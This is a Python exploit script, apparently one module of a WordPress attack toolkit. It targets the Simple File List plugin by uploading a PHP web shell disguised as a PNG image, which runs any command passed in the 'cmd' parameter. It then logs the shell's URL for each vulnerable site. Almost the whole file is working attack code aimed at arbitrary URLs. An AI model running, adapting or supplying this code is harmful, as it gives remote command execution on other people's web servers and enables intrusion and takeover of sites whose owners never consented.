import sys
import os
import random
try:
    # The insertion index should be 1 because index 0 is this file
    sys.path.insert(1, '{}/help'.format(os.getcwd()))  # the type of path is string
    # because the system path already have the absolute path to folder a
    # so it can recognize file_a.py while searching 
    from help.banner import colors
    from help.json_me import json_me
    from help.req import request
    
    
except (ModuleNotFoundError, ImportError) as e:
    print("{} fileure".format(type(e)))
else:
    print("Import succeeded")

 
dir_path = '/wp-content/uploads/simple-file-list/'
upload_path = '/wp-content/plugins/simple-file-list/ee-upload-engine.php'
move_path = '/wp-content/plugins/simple-file-list/ee-file-engine.php'


def gen_shell():
    file_name = f'{random.randint(0, 666)}.png'
    with open(file_name , "w") as writer:
        writer.write("GIF89a;<?php echo 'POC By Eng Yazeed';system($_GET['cmd']); ?>")
    
    return file_name




def exploit(url):
    found = []
    req = request(url)
    if not (url.startswith('https://') or url.startswith('http://')):
        if url.endswith('/'):
            url = "http://" + url.strip('/')
    
    try:
        file = gen_shell()
        files = {'file': (file, open(file, 'rb'), 'image/png')}
        dates = {
            'eeSFL_ID': 1,
            'eeSFL_FileUploadDir': dir_path,
            'eeSFL_Timestamp': 1587258885, 
            'eeSFL_Token': 'ba288252629a5399759b6fde1e205bc2'

        }
        x = f"{url}{upload_path}"
        r = req.post(x, files=files, data=dates)
        if r.status_code == 200:
            os.remove(file)
            print(colors.yellow + "[+] ==> simple_file_list %s Vulnerable" % url)
            found.append({
                "url": url,
                "payload": r.url,
                "status": r.status_code,
                "exploit": "simple_file_list",
                "shell": f"{url}{dir_path}{file}"
            })
            json_me(url, "simple_file_list", found)
        else:
            os.remove(file)
            print(colors.red + "[-] simple_file_list ==> %s Not Vulnerable" % url)


    except Exception as e:
        print("[-] simple_file_list ==> %s Not Working" % e)
        pass
        


    